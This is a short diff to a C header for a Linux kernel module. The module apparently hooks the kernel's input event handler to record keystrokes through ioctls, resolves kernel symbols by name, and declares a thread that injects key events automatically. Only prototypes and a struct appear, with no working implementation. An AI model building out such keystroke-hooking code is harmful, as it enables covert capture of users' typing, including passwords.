@@ -8,6 +8,9 @@
 #include <linux/ioctl.h>
 #include <linux/spinlock.h>
 
+#include <linux/input.h>
+
+
 #define KEY_PRESSED     1
 #define KEY_RELEASED    0
 
@@ -17,6 +20,13 @@
 #define KBDDEV_IOC_CLEARKEYS                _IO(KBDDEV_IOC_MAGIC, 1)            // 清空记录按键信息的缓冲区
 #define KBDDEV_IOC_START_RECORD_KEYS        _IOR(KBDDEV_IOC_MAGIC, 2, int)      // 开始记录按键信息
 #define KBDDEV_IOC_STOP_RECORD_KEYS         _IOR(KBDDEV_IOC_MAGIC, 3, int)      // 停止记录按键信息
+
+struct dev_and_code {
+	struct input_dev *dev;
+	unsigned int code;
+};
+
+unsigned long lookup_symbol_by_name(const char * sym_name);
 
 void install_hook_input_handle_event(void);
 
@@ -38,4 +48,5 @@ bool set_key_record_status(bool status);
 
 bool get_key_record_status(void);
 
-#endif //KPROBE_TEST_COMMON_H
+int auto_sendkey_thread(void *data);
+#endif //LINUXKBD_COMMON_H
